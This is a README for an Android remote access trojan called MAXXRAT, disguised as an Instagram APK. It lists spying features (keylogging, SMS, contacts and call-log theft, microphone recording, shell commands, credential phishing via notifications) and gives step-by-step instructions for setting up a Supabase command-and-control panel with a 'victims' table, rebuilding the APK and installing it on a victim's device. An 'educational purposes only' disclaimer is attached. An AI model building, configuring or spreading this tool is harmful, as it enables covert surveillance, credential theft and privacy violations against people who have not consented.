<p align="center">
 <img src= "https://github.com/GoutamHX/MAXXRAT/assets/148895787/59d554d8-8766-43f6-b964-40b193523207" style="height:100px;width:100px;" >
</p>
<h1 align=center>MAXXRAT</h1>

## A Advance RAT -multifunctional Android RAT with GUI based Web Panel without port forwarding (Now with Supabase Backend)


</div>

## Features
 - Read all the files of Internal Storage
 - Download Any Media to your Device from Victims Device
 - Get all the system information of Victim Device
 - Retrieve the List of Installed Applications
 - Retrive SMS
 - Retrive Call Logs
 - Retrive Contacts
 - Send SMS
 - Gets all the Notifications
 - Keylogger
 - Admin Permission
 - Show Phishing Pages to steal credentials through notification.
    - Steal credentials through pre built phishing pages
    - Open any suspicious website through notification to steal credentials.
 - Record Audio through Mic
 - Play music in Victim's device
 - Vibrate Device
 - Text To Speech
 - Turn On/Off Torch Light
 - Change Wallpaper
 - Run shell Commands
 - Get Clipboard text (Only When app's Activity is visible)
 - Launch Any URL (Only When app's Activity is visible)
 - Pre Binded with [Instagram Webview Phishing ]
 - Runs In Background
    - Auto Starts on restarting the device
    - Auto Starts when any notification arrives
 - No port forwarding needed
 - **NEW**: Supabase Backend (More reliable and faster)
 - **NEW**: External CSS styling for better maintainability

<img align=center src=./.github/img.jpg >

## Requirements
 - Supabase Account (Free tier available)
 - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) (For PC) or
   [ApkTool M](https://maximoff.su/apktool/?lang=en) (for Android)


## How to Build

### Supabase Setup

1. Create a Supabase Account at [supabase.com](https://supabase.com) and create a new project
2. Go to your project settings and copy the following:
   - Project URL
   - Project API Key (anon/public key)
3. Enable Row Level Security (RLS) for your database tables
4. Create the following tables in your Supabase database:
   - `victims` - for storing victim device information
   - `commands` - for storing commands to be executed
   - `logs` - for storing activity logs

#### Database Connection Options

Supabase provides multiple ways to connect to your Postgres database. Choose the appropriate method based on your use case:

**For Frontend Applications (Recommended for Web Panel):**

- Use the Data API with Supabase client libraries
- Connection string: `https://your-project-ref.supabase.co`
- API Key: Your anon/public key

**For Direct Database Connections:**

- Direct connection (IPv6 only): `postgresql://postgres:[PASSWORD]@db.[PROJECT-REF].supabase.co:5432/postgres`
- Best for: Persistent servers, VMs, long-lasting containers

**For Connection Pooling (Shared Pooler - Free):**

- **Session Mode** (for persistent clients): `postgres://postgres.[PROJECT-REF]:[PASSWORD]@aws-0-[REGION].pooler.supabase.com:5432/postgres`
  - Supports IPv4 and IPv6
  - Best for: Database GUIs, persistent applications
- **Transaction Mode** (for serverless/edge functions): `postgres://postgres.[PROJECT-REF]:[PASSWORD]@aws-0-[REGION].pooler.supabase.com:6543/postgres`
  - Best for: Serverless functions, temporary connections
  - Note: Does not support prepared statements

**For Dedicated Pooler (Paid tier):**

- Enhanced performance with dedicated PgBouncer
- Requires IPv6 or IPv4 add-on
- Best for: High-performance applications

Get your connection strings from the Supabase Dashboard → Connect button.

### Panel Setup

1. You can use GitHub Pages, Vercel, Netlify, or any hosting service for the web panel
2. Open [index.html](./WEB%20PANEL/index.html) and update the Supabase configuration (lines 16-18):

   ```javascript
   const supabaseUrl = 'https://your-project-ref.supabase.co';
   const supabaseKey = 'your-anon-key';
   ```

3. The panel now uses Supabase for real-time data synchronization and includes:
   - Real-time victim connection monitoring
   - Command execution with instant feedback
   - Live activity logs
   - Connection pooler support for better performance
4. Upload the entire `WEB PANEL` folder to your hosting service

### Android RAT Setup

1. Download [Instagram.apk](./ANDROID%20APP/Instagram.apk)
2. Decompile it using any decompiler mentioned in requirements
3. Open `res/values/strings.xml` file
4. Replace the Supabase configuration values:

   ```xml
   <string name="supabase_url">https://your-project-ref.supabase.co</string>
   <string name="supabase_anon_key">your-anon-key</string>
   <string name="supabase_service_role_key">your-service-role-key</string>
   ```

5. Recompile the APK with apktool
6. Install on victim's device and grant all permissions
7. The connection will appear in your Supabase database and web panel

### Tutorial Videos

1. [✅Tutorial](https://devuploads.com/2wpyv6s93l8d)

## ❤️JOIN TELEGRAM CHANNELS FOR MORE UPDATES❤️

1. [❤️‍🔥1.TELEGRAM](https://t.me/TheAdvanceBots)
2. [❤️‍🔥2.TELEGRAM](https://t.me/MAXX_MODS)

## If you face any problem in MAXXRAT setup then contact the admin

- [💕Admin](https://t.me/MR_GOUTAM08)

## CREDIT ❤️✅

AIRAVAT -RAT

## DISCLAIMER

> **TO BE USED FOR EDUCATIONAL PURPOSES ONLY**

The use of the MAXXRAT is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Please read [LICENSE](LICENSE).
